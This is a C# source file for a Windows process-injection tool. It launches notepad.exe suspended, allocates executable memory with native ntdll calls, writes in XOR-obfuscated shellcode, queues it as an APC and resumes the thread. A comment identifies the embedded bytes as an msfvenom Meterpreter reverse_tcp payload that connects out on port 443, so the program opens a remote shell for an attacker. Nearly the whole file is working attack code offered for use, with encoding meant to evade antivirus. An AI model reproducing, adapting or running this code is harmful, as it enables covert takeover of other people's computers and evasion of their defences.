using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessCreateAndInject
{
    class Program
    {
        // Constants
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint THREAD_ALL_ACCESS = 0x1F03FF;
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint CREATE_SUSPENDED = 0x00000004;

        // Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        // Imports
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll")]
        private static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [DllImport("ntdll.dll")]
        private static extern uint NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            uint BufferLength,
            out uint BytesWritten);

        [DllImport("ntdll.dll")]
        private static extern uint NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [DllImport("ntdll.dll")]
        private static extern uint NtResumeThread(
            IntPtr ThreadHandle,
            out uint PreviousSuspendCount);

        static void Main(string[] args)
        {
            try
            {
                // Configuration - change these as needed
                string targetProcess = @"C:\Windows\System32\notepad.exe";

                // Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=eth0 LPORT=443 -f csharp
                // The shellcode XOR'd with key: 0xfa
                byte[] shellcode = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB2, 0x71, 0x88, 0xAA, 0xB7, 0xCB, 0x33, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xB2, 0xFB, 0x2A, 0x9C, 0x7B, 0x82, 0xE2, 0xF1, 0xF8, 0xBB, 0xAB, 0xF5, 0x7F, 0x88, 0xFA, 0xFA, 0xFA, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xBE, 0x71, 0xBA, 0xDA, 0xAA, 0xB3, 0xFB, 0x2A, 0x71, 0xB2, 0xE2, 0x19, 0xAC, 0xB7, 0xCB, 0x33, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB2, 0xCB, 0x3A, 0x56, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xBB, 0xA2, 0xB2, 0xFB, 0x2A, 0xBB, 0xA2, 0xA4, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xB1, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0x3A, 0x52, 0xE3, 0xEC, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0xBB, 0xA4, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0xB3, 0x05, 0x34, 0x8F, 0x1F, 0x12, 0x69, 0xFA, 0xFA, 0xFA, 0xB2, 0x79, 0x16, 0xEA, 0xB2, 0x73, 0x18, 0xB7, 0xCB, 0x33, 0x90, 0xFE, 0xBB, 0xA2, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xAF, 0xB2, 0x79, 0x3E, 0xDA, 0xA4, 0x73, 0x0C, 0x90, 0xBA, 0xBB, 0xA3, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xBB, 0xA2, 0xB2, 0x73, 0x08, 0xB2, 0xCB, 0x33, 0xBB, 0x40, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0xB2, 0x73, 0x39, 0xB3, 0x73, 0x3D, 0xB7, 0xCB, 0x33, 0xB3, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

                // Create suspended process
                var pi = CreateSuspendedProcess(targetProcess);
                Console.WriteLine($"[+] Created process PID: {pi.dwProcessId}");

                for (int j = 0; j < shellcode.Length; j++)
                {
                    shellcode[j] = (byte)((uint)shellcode[j] ^ 0xfa);
                }



                // Allocate memory in target process
                IntPtr shellcodeAddr = AllocateMemory(pi.hProcess, shellcode.Length);
                Console.WriteLine($"[+] Allocated memory at: 0x{shellcodeAddr.ToInt64():X}");

                // Write shellcode to target process
                WriteMemory(pi.hProcess, shellcodeAddr, shellcode);
                Console.WriteLine("[+] Shellcode written");

                // Queue APC to main thread
                QueueAPC(pi.hThread, shellcodeAddr);
                Console.WriteLine("[+] APC queued to main thread");

                // Resume thread to execute shellcode
                ResumeThread(pi.hThread);
                Console.WriteLine("[+] Thread resumed");

                Console.WriteLine("[!] Injection complete!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        static PROCESS_INFORMATION CreateSuspendedProcess(string processPath)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;

            bool success = CreateProcess(
                processPath,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (!success)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

            return pi;
        }

        static IntPtr AllocateMemory(IntPtr hProcess, int size)
        {
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(size);
            uint status = (uint)NtAllocateVirtualMemory(
                hProcess,
                ref baseAddr,
                IntPtr.Zero,
                ref regionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (status != 0)
                throw new Exception($"Memory allocation failed (0x{status:X8})");

            return baseAddr;
        }

        static void WriteMemory(IntPtr hProcess, IntPtr address, byte[] data)
        {
            uint status = NtWriteVirtualMemory(
                hProcess,
                address,
                data,
                (uint)data.Length,
                out _);

            if (status != 0)
                throw new Exception($"Memory write failed (0x{status:X8})");
        }

        static void QueueAPC(IntPtr hThread, IntPtr shellcodeAddr)
        {
            uint status = NtQueueApcThread(
                hThread,
                shellcodeAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (status != 0)
                throw new Exception($"APC queue failed (0x{status:X8})");
        }

        static void ResumeThread(IntPtr hThread)
        {
            uint status = NtResumeThread(hThread, out _);
            if (status != 0)
                throw new Exception($"Thread resume failed (0x{status:X8})");
        }
    }
}
